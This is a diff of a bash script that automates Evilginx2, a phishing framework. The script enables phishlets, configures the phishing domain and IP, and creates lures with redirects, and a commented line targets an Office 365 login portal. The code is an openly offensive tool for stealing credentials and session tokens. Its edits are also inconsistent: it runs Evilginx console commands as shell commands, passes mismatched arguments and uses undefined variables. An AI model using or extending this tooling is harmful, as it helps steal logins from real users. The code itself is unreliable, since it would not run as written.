@@ -3,20 +3,22 @@ setup_evilginx() {
     domain_name=$1
     hostname=$2
     redirect_url=$3
+    default_phishlet=$4
     
     echo "Setting up Evilginx for domain: $domain_name"
 
-    # Load the phishlet
-    sudo evilginx phishlets upload "$phishlet_path"
-
     # Enable the phishlet
-    sudo evilginx phishlets enable example
-
+    #sudo evilginx phishlets enable $default_phishlet
+    phishlets enable $default_phishlet
+    
     # Set up the hostname (domain or subdomain)
-    sudo evilginx config domain "$subdomain"
-
+    #sudo evilginx config domain "$subdomain"
+    config domain "$subdomain"
+    
     # Bind to the IP address
-    sudo evilginx config ip "$host_ip"
+    #sudo evilginx config ip "$host_ip"
+    config ip "$host_ip"
+    
 }
 
 create_lure() {
@@ -25,14 +27,16 @@ create_lure() {
     redirect_url=$3
     
     # Create the lure
-    sudo evilginx lures create "$phishlet" >/dev/null 2>&1
+    lures create "$phishlet" >/dev/null 2>&1
+    #sudo evilginx lures create "$phishlet" >/dev/null 2>&1
 
     # Get the generated URL
     local lure_url
     lure_url=$(sudo evilginx lures get-url "$phishlet" "$hostname")
 
     # Set the redirect URL
-    sudo evilginx lures redirect "$phishlet" "$redirect_url" >/dev/null 2>&1
+    lures redirect "$phishlet" "$redirect_url" >/dev/null 2>&1
+    #sudo evilginx lures redirect "$phishlet" "$redirect_url" >/dev/null 2>&1
 
     # Output only the URL
     echo "$lure_url"
@@ -172,11 +176,12 @@ domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
 host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
 default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
 default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
-opsgenie_api_key=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
+opsgenie_api_key=$(jq -r '.Opsgenie.API_key' "$config_file")
+
 #Setup EvilGinx2
 mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data
 /bin/evilginx -p /app/phishlets/ -developer -debug
-setup_evilginx
+setup_evilginx $domain_name $host_ip $default_redirect $default_phishlet
 
 # Automate multiple lure creation
 #create_lure $default_phishlet $domain_name "https://portal.office.com"
